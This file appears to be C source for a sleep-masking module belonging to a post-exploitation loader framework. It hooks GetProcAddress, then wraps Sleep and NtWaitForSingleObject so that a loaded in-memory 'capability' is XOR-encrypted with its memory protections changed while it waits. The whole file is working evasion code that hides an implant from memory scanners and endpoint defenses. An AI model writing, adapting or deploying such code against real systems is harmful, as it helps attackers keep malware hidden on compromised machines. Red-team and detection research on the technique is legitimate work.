#include <windows.h>
#include "../tcg.h"

WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect (LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

char SLEEPMASK_KEY[32] __attribute__((section(".text")));

char *CAP_PTR;
size_t CAP_SIZE;

void xor_region() {
	// Change memory protections of the capability.
	DWORD oldProt = 0;
	KERNEL32$VirtualProtect(CAP_PTR, CAP_SIZE, PAGE_READWRITE, &oldProt);
	
	// Obfuscate or deobfuscate the capability.
	char *ptr = (char *) CAP_PTR;
	for(int i = 0; i < CAP_SIZE; i++) {
		ptr[i] = ptr[i] ^ SLEEPMASK_KEY[i % 32];
	}
	
	// Reprotect the capability.
	KERNEL32$VirtualProtect(CAP_PTR, CAP_SIZE, oldProt, &oldProt);
}

WINBASEAPI VOID WINAPI _Sleep(DWORD dwMilliseconds) {
	// Hook for KERNEL32$Sleep.
	xor_region();
	KERNEL32$Sleep(dwMilliseconds);
	xor_region();
}

WINBASEAPI NTSTATUS NTAPI _NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
	// Hook for NTDLL$NtWaitForSingleObject.

	xor_region();
	NTSTATUS status = NTDLL$NtWaitForSingleObject(Handle, Alertable, Timeout);
	xor_region();
	
	return status;
}

LPVOID WINAPI sleepmask(HMODULE hModule, LPCSTR lpProcName) {
	// A function that hooks GetProcAddress() to implement sleep masking.
	
	// lpProcName might be an ordinal, in which case we should leave it alone.
	if ((ULONG_PTR) lpProcName >> 16 == 0) {
		return KERNEL32$GetProcAddress(hModule, lpProcName);
	}
	
	// Use the __resolve_hook() intrinsic, which attempts to resolve lpProcName to a hooked function.
	LPVOID result = __resolve_hook( ror13hash( lpProcName ) );
	if (result != NULL) { return result; }
	
	// If that fails, fall back to the basic GetProcAddress().
	return KERNEL32$GetProcAddress(hModule, lpProcName);
}

void go(char *capability, size_t size) {
	CAP_PTR = capability;
	CAP_SIZE = size;
}
